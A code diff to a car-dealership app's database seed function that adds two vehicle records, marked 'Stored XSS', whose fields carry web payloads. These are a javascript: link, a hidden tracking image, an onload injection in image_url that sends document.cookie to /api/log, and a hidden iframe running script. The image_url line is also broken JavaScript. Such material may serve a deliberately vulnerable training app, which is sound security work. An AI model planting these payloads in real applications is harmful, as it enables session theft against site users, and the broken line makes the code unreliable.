@@ -191,6 +191,33 @@ async function seedDatabase(db) {
       engine: "4A-GE",
       description: "Iconic Initial D drift legend. Classic Japanese sports coupe."
     },
+    //Stored XSS
+    {
+        name: "2024 Toyota Camry",
+        year: 2024,
+        price: 28000,
+        image_url: "https://carwow-uk-wp-3.imgix.net/Toyota-Camry-Hybrid-Exterior-Dynamic-NOT-UK-SPEC-19.jpg",
+        mileage: 0,
+        color: "Midnight Black",
+        transmission: "Automatic",
+        horsepower: 203,
+        fuel_type: "Hybrid",
+        engine: "2.5L 4-cylinder",
+        description: "Excellent fuel economy. Features include: <a href='javascript:console.log(`user clicked link`)'>Premium Audio</a> and <img src='/api/track?item=camry' style='display:none'>",
+    },
+    {
+        name: "Honda Civic LX",
+        year: 2023,
+        price: 23500,
+        image_url: "https://di-uploads-pod10.dealerinspire.com/hondaworlddowney/uploads/2018/03/2017-honda-civic-lx-front-side.jpg" onload=\"fetch('/api/log?data='+encodeURIComponent(document.cookie))",
+        mileage: 15000,
+        color: "Crystal Red",
+        transmission: "CVT",
+        horsepower: 158,
+        fuel_type: "Petrol",
+        engine: "2.0L",
+        description: "Great daily driver. <iframe src='data:text/html,<script>parent.postMessage(`iframe loaded`,\"*\")</script>' style='width:0;height:0;border:0'></iframe>",
+    }
   ];
 
   for (const vehicle of vehicles) {
@@ -205,7 +232,7 @@ async function seedDatabase(db) {
         vehicle.price,
         vehicle.image_url,
         vehicle.mileage,
-        vehicle.color, // This was missing for AE86
+        vehicle.color, 
         vehicle.transmission,
         vehicle.fuel_type,
         vehicle.horsepower,
